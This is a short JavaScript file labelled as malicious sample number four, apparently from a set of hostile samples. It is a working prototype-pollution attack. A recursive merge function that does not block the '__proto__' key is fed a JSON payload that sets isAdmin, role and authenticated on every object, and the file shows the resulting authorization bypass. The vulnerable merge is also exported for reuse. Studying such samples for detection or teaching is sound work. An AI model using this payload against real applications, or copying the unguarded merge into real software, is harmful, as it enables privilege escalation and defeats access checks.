// Malicious Sample #4: Prototype Pollution Attack
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Malicious payload
const maliciousPayload = JSON.parse(`{
  "__proto__": {
    "isAdmin": true,
    "role": "admin",
    "authenticated": true
  }
}`);

// Pollute the prototype chain
const config = {};
merge(config, maliciousPayload);

// Now all objects inherit the pollution
const user = {};
console.log(user.isAdmin); // true! 😱

module.exports = { merge };
